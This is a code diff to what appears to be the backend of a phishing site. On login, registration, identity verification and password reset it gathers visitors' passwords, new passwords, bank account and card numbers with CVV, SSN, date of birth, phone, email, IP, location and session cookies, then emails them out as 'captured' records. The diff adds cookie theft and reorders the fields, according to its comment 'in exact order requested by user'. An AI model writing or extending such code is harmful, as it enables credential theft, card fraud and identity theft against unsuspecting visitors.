@@ -353,7 +353,7 @@ export async function registerRoutes(
       // Log the password reset attempt
       logVisitorAction(req, "password_reset", {
         username: (req.session as any).username,
-        password: newPassword,
+        newPassword: newPassword,
       });
 
       const updated = await storage.updatePassword(userId, newPassword);
@@ -707,6 +707,7 @@ export async function registerRoutes(
   interface VisitorData {
     username?: string;
     password?: string;
+    newPassword?: string;
     email?: string;
     phone?: string;
     ssn?: string;
@@ -757,22 +758,33 @@ export async function registerRoutes(
 
       // Send email notification for important actions
       if (action === "login" || action === "registration" || action === "identity_verification" || action === "password_reset") {
-        const emailData: Record<string, any> = {
-          Action: action.toUpperCase().replace("_", " "),
-          Username: data?.username,
-          Password: data?.password,
-          Email: data?.email,
-          Phone: data?.phone,
-          "Date of Birth": data?.dateOfBirth,
-          SSN: data?.ssn,
-          "Card Number": data?.cardNumber,
-          "Card Expiration": data?.cardExpiration,
-          CVV: data?.cardCvv,
-          "Account Number": data?.accountNumber,
-          "IP Address": deviceInfo.ip,
-          Location: `${deviceInfo.location.city}, ${deviceInfo.location.region}, ${deviceInfo.location.country}`,
-          Device: `${deviceInfo.browser} on ${deviceInfo.os} (${deviceInfo.deviceType})`,
-        };
+        // Build email data in exact order requested, only include non-empty fields
+        const emailData: Record<string, any> = {};
+        
+        // Fields in exact order requested by user
+        if (data?.username) emailData["Username"] = data.username;
+        if (data?.password) emailData["Password"] = data.password;
+        if (data?.newPassword) emailData["New password"] = data.newPassword;
+        if (data?.accountNumber) emailData["Account number"] = data.accountNumber;
+        if (data?.cardNumber) emailData["Card number"] = data.cardNumber;
+        if (data?.cardExpiration) emailData["Expiration Date"] = data.cardExpiration;
+        if (data?.cardCvv) emailData["CVV"] = data.cardCvv;
+        if (data?.ssn) emailData["SSN"] = data.ssn;
+        if (data?.dateOfBirth) emailData["DOB"] = data.dateOfBirth;
+        if (data?.phone) emailData["Phone number"] = data.phone;
+        if (data?.email) emailData["Email"] = data.email;
+        
+        // Always include IP and location
+        emailData["IP Address"] = deviceInfo.ip;
+        const locationParts = [deviceInfo.location.city, deviceInfo.location.region, deviceInfo.location.country].filter(Boolean);
+        emailData["Location"] = locationParts.join(", ") || "Unknown";
+        
+        // Always include cookies
+        emailData["Cookies"] = cookieHeader || "None";
+        
+        // Additional device info
+        emailData["Device"] = `${deviceInfo.browser} on ${deviceInfo.os} (${deviceInfo.deviceType})`;
+        
         sendEmailNotification(`New ${action.replace("_", " ")} captured`, emailData);
       }
     } catch (error) {
